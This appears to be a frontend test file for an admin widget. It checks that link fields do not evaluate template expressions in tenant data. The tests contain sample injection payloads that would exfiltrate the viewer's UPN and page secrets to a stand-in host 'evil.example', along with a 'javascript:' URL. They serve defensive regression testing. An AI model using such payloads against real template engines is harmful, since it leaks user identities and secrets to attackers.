import { screen, within } from '@testing-library/react';
import { renderTemplate } from '@adminforge/expressions';
import { WIDGETS, type KeyValueConfig } from '@adminforge/widgets';
import { ready, renderWidget, spyRuntime } from './helpers';

// A keyValue `link` field without `href` links the value itself, literally. Tenant data is never evaluated as an
// expression: a multi-tenant app's homepage or sign-on URL is set by its outside publisher (enterprise-app page), and
// evaluating it would let that publisher read the viewer's UPN and the page's datasources into the link.
vi.mock('@adminforge/expressions', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@adminforge/expressions')>();
  return { ...actual, renderTemplate: vi.fn(actual.renderTemplate) };
});

const KeyValue = WIDGETS.keyValue!.component;
const parse = (fields: unknown[]) =>
  WIDGETS.keyValue!.schema.parse({ widget: 'keyValue', title: 'App', data: 'app', fields }) as KeyValueConfig;
const plain = parse([
  { field: 'homepage', label: 'Home page', kind: 'link' },
  { field: 'loginUrl', label: 'Sign-on URL', kind: 'link' },
]);

const term = (name: string) => screen.getByText(name, { selector: 'dt' }).parentElement!;
const settle = () => new Promise((r) => setTimeout(r, 30));

/** A signed-in viewer and a page datasource an attacker would like to read. */
const viewer = () =>
  spyRuntime({
    scope: {
      user: { upn: 'adele.vance@example.com', oid: 'oid-1', name: 'Adele', roles: ['Reader'] },
      params: {},
      now: '2026-10-15T00:00:00Z',
      secrets: { value: [{ displayName: 'prod key', hint: 'abc' }] },
    },
  });

afterEach(() => vi.mocked(renderTemplate).mockClear());

describe('keyValue link fields without href', () => {
  it('a value that is a template shows as text: not evaluated, not a link', async () => {
    const { runtime } = viewer();
    const { container } = renderWidget(
      KeyValue,
      plain,
      ready({ homepage: '${ user.upn }', loginUrl: "${ 'https://evil.example/?u=' & user.upn }" }),
      runtime,
    );
    await settle();
    expect(term('Home page')).toHaveTextContent('${ user.upn }');
    expect(term('Sign-on URL')).toHaveTextContent("${ 'https://evil.example/?u=' & user.upn }");
    expect(container).not.toHaveTextContent('adele.vance@example.com');
    expect(container.querySelector('a')).toBeNull();
    expect(renderTemplate).not.toHaveBeenCalled();
  });

  it('a URL carrying a template links to exactly that text, with nothing filled in', async () => {
    const { runtime } = viewer();
    const url = 'https://evil.example/collect?u=${ user.upn }&d=${ $string(secrets) }';
    renderWidget(
      KeyValue,
      plain,
      ready({ homepage: url, loginUrl: 'https://login.example.com/$${x}' }),
      runtime,
    );
    await settle();
    const home = within(term('Home page')).getByRole('link');
    expect(home).toHaveAttribute('href', url);
    expect(home.getAttribute('href')).not.toContain('adele');
    expect(home).toHaveAttribute('target', '_blank');
    // `$${` is template escaping for content; data keeps its characters.
    expect(within(term('Sign-on URL')).getByRole('link')).toHaveAttribute(
      'href',
      'https://login.example.com/$${x}',
    );
    expect(renderTemplate).not.toHaveBeenCalled();
  });

  it('plain external URLs still link (enterprise app homepage, SharePoint site URL)', () => {
    renderWidget(
      KeyValue,
      plain,
      ready({ homepage: 'https://app.example.com/', loginUrl: 'mailto:help@example.com' }),
    );
    expect(within(term('Home page')).getByRole('link')).toHaveAttribute('href', 'https://app.example.com/');
    expect(within(term('Sign-on URL')).getByRole('link')).toHaveAttribute('href', 'mailto:help@example.com');
  });

  it('in-app paths and unsafe schemes from data stay text', () => {
    const { container } = renderWidget(
      KeyValue,
      plain,
      ready({
        homepage: '/p/identity.user?id=x&playbook=identity.add-owner',
        loginUrl: 'javascript:alert(1)',
      }),
    );
    expect(term('Home page')).toHaveTextContent('/p/identity.user?id=x&playbook=identity.add-owner');
    expect(container.querySelector('a')).toBeNull();
  });
});

describe('keyValue link fields with href (content)', () => {
  it('the template is evaluated with `value` and `row`; the data inside it stays data', async () => {
    const { runtime } = viewer();
    const config = parse([
      {
        field: 'displayName',
        label: 'App',
        kind: 'link',
        href: "${ '/p/identity.enterprise-app?id=' & row.id & '&name=' & value }",
      },
    ]);
    renderWidget(KeyValue, config, ready({ id: 'sp-1', displayName: '${ user.upn }' }), runtime);
    const link = await within(term('App')).findByRole('link');
    expect(link).toHaveAttribute('href', '/p/identity.enterprise-app?id=sp-1&name=${ user.upn }');
    expect(link).toHaveTextContent('${ user.upn }');
    expect(renderTemplate).toHaveBeenCalledTimes(1);
  });

  it('a simple path href resolves without the evaluator', () => {
    const config = parse([{ field: 'name', label: 'Site', kind: 'link', href: '${ row.webUrl }' }]);
    renderWidget(
      KeyValue,
      config,
      ready({ name: 'Finance', webUrl: 'https://example.sharepoint.com/sites/fin' }),
    );
    expect(within(term('Site')).getByRole('link')).toHaveAttribute(
      'href',
      'https://example.sharepoint.com/sites/fin',
    );
  });
});
